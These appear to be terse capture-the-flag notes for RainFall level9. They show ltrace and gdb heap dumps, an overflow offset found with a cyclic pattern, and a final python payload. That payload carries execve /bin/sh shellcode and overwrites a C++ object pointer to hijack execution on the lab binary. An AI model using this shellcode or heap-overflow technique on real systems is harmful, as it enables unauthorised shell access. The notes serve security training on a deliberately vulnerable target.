level9@RainFall:~$ ltrace ./level9 
__libc_start_main(0x80485f4, 1, 0xbffff6f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_exit(1 <unfinished ...>
+++ exited (status 1) +++
level9@RainFall:~$ ltrace ./level9 lol
__libc_start_main(0x80485f4, 2, 0xbffff6f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff6f4, 0xbffff700, 0xb7d79e55, 0xb7fed280)      = 0x804a008
_Znwj(108, 5, 0xbffff700, 0xb7d79e55, 0xb7fed280)               = 0x804a078
strlen("lol")                                                   = 3
memcpy(0x0804a00c, "lol", 3)                                    = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++

(gdb) x/32wx 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x41414141
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000


Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5
lenght = 108

(gdb)  x/32wx 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x41306141
0x804a010:      0x61413161      0x33614132      0x41346141      0x61413561
0x804a020:      0x37614136      0x41386141      0x62413961      0x31624130
0x804a030:      0x41326241      0x62413362      0x35624134      0x41366241
0x804a040:      0x62413762      0x39624138      0x41306341      0x63413163
0x804a050:      0x33634132      0x41346341      0x63413563      0x37634136
0x804a060:      0x41386341      0x64413963      0x31644130      0x41326441
0x804a070:      0x64413364      0x35644134      0x08048848      0x00000000


"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + 83 + 0x 08 04 a0 0c

$(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')